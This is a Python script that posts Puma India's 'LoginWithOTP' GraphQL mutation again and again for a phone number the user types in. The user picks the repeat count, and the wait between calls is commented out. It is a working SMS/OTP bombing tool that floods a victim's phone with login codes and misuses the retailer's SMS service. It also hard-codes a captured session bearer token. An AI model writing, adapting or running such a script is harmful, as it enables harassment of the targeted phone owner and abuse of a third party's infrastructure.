import requests
import time

def send_otp_request(mobile_number, repeat_times):
    url = "https://in.puma.com/api/graphql"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJ2ZXIiOiIxLjAiLCJqa3UiOiJzbGFzL3Byb2QvYmN3cl9wcmQiLCJraWQiOiI0N2VhYmUxMi01M2QyLTQ2MzgtYTZmMS1lMGFlNjQzZGRmNjAiLCJ0eXAiOiJqd3QiLCJjbHYiOiJKMi4zLjQiLCJhbGciOiJFUzI1NiJ9.eyJhdXQiOiJHVUlEIiwic2NwIjoic2ZjYy5zaG9wcGVyLW15YWNjb3VudC5iYXNrZXRzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzIHNmY2Muc2hvcHBlci1wcm9kdWN0cyBzZmNjLnNob3BwZXItbXlhY2NvdW50LnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMubG9naW4gc2ZjYy5zaG9wcGVyLWNvbnRleHQucncgc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5vcmRlcnMgc2ZjYy5zaG9wcGVyLWN1c3RvbWVycy5yZWdpc3RlciBzZmNjLnNob3BwZXItYmFza2V0cy1vcmRlcnMgc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5hZGRyZXNzZXMucncgc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wcm9kdWN0bGlzdHMucncgc2ZjYy5zaG9wcGVyLXByb2R1Y3RsaXN0cyBzZmNjLnNob3BwZXItcHJvbW90aW9ucyBzZmNjLnNob3BwZXItYmFza2V0cy1vcmRlcnMucncgc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wYXltZW50aW5zdHJ1bWVudHMucncgc2ZjYy5zaG9wcGVyLWdpZnQtY2VydGlmaWNhdGVzIHNmY2Muc2hvcHBlci1wcm9kdWN0LXNlYXJjaCBzZmNjLnNob3BwZXItbXlhY2NvdW50LnByb2R1Y3RsaXN0cyBzZmNjLnNob3BwZXItY2F0ZWdvcmllcyBzZmNjLnNob3BwZXItbXlhY2NvdW50Iiwic3ViIjoiY2Mtc2xhczo6YmN3cl9wcmQ6OnNjaWQ6OGMyMzM2MzMtNzQ2ZS00NDc5LWI0OWUtYmQ5YjRjNDNmMTk5Ojp1c2lkOjUxMDA1M2I4LWZlZjAtNDY2YS1iNDlmLWIxYzc2NTQ1NDk2OCIsImN0eCI6InNsYXMiLCJpc3MiOiJzbGFzL3Byb2QvYmN3cl9wcmQiLCJpc3QiOjEsImRudCI6IjAiLCJhdWQiOiJjb21tZXJjZWNsb3VkL3Byb2QvYmN3cl9wcmQiLCJuYmYiOjE3MTg3NzA2ODAsInN0eSI6IlVzZXIiLCJpc2IiOiJ1aWRvOnNsYXM6OnVwbjpHdWVzdDo6dWlkbjpHdWVzdCBVc2VyOjpnY2lkOmFibHJjVWtic1h3SEVSeEt0S2thWVlsSHhGOjpjaGlkOklOIiwiZXhwIjoxNzE4NzcyNTEwLCJpYXQiOjE3MTg3NzA3MTAsImp0aSI6IkMyQy0xNDcwNTc4NzY1MDQ0ODA4OTQ0MjMxMzkwMDA0MDgxOTY3NjAifQ.-wV3e3nEO1f1_OORmS56dIj6NpFeH9mP11eKMYJ9dZeNVrJmO1hlB_Yhd6G6XM2RVgucB_Y9PIkpPb3APj363A",
        "Accept": "application/graphql-response+json, application/graphql+json, application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Origin": "https://in.puma.com",
        "Referer": "https://in.puma.com/in/en/account/login?action=login&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xZwHUtvX1RdBaAOszK2jw13zZRIjfBK5hTFjyOMoLugsw5Jrm7R8VYaAufjEALw_wcB&utm_aud=OTH&utm_campaign=BS_GGL_IN_BS_GGL_SEA_TXT_Brand-Exact_agency_1000067495857508873&utm_medium=BS&utm_obj=OLC&utm_source=GGL-SEA"
    }
    data = {
        "operationName": "LoginWithOTP",
        "query": """
        mutation LoginWithOTP($recaptchaToken: String, $phoneNo: String!) {\n  loginWithOTP(input: {recaptchaToken: $recaptchaToken, phoneNo: $phoneNo})\n}
        """,
        "variables": {
            "phoneNo": mobile_number
        }
    }

    for _ in range(repeat_times):
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"Success for mobile number: {mobile_number}")
            else:
                print(f"Failed for mobile number: {mobile_number}, Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")
        
        #time.sleep(35)  # Wait for 35 seconds between each call

def main():
    mobile_number = input("Enter the mobile number: ")
    repeat_times = int(input("Enter the number of times to repeat the request: "))
    send_otp_request(mobile_number, repeat_times)

if __name__ == "__main__":
    main()
